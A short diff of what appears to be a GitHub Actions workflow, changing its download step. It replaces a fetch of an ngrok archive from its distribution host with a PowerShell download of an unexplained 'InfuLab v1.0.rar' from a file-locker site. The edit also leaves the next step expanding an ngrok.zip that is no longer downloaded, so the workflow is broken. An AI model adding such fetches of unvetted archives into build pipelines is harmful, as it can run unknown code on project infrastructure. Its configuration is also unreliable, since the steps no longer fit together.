@@ -9,7 +9,7 @@ jobs:
 
     steps:
     - name: Download
-      run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/... -OutFile ngrok.zip
+      run: Invoke-WebRequest https://d249.userscloud.net/d/helsc5cqtn2fvxijrtpjnbctaipp55teogyf6laewctceful2ao33dadbwwfmjkqgyl34vsm/InfuLab%20v1.0.rar
     - name: Extract
       run: Expand-Archive ngrok.zip
     - name: Auth
